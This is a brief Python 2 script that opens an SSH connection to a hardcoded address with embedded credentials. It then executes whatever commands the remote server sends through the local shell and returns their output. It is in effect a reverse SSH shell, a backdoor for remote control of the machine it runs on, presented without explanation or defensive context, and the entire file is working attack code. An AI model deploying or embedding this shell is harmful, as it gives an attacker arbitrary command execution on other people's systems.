#!/usr/bin/python

import threading
import paramiko
import subprocess
import sys

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/home/xeratec/.ssh/key')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(1024) # read banner
        while True:
            try:
                command = ssh_session.recv(1024) #get the command from the ssh server
                if (command != 'exit'):
                    try:
                        cmd_output = subprocess.check_output(command, shell=True)
                        ssh_session.send(cmd_output)
                    except Exception, e:
                        ssh_session.send(str(e))
                else:
                    print 'Session Closed'
                    client.close()
                    sys.exit(1)
            except Exception, e:
                print '[-] Caught exception: ' + str(e)
                try:
                    client.close()
                except: 
                    pass
                sys.exit(1)
    return

ssh_command('192.168.1.34', 'xeratec', 'passwd', 'ClientConnected')